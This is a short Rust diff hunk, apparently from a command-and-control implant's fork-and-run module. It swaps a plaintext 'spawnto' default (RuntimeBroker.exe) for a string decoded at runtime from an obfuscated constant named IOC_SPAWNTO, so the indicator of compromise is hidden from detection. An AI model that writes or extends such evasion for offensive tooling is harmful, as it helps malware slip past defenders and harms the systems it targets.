@@ -33,7 +33,7 @@ pub struct ForkRunArgs {
     pub timeout: u32,
 }
 
-fn default_spawnto() -> String { "C:\\Windows\\System32\\RuntimeBroker.exe".to_string() }
+fn default_spawnto() -> String { crate::obfstr::d(crate::obfstr::IOC_SPAWNTO) }
 fn default_timeout() -> u32 { 30 }
 
 fn download_file_chunks(
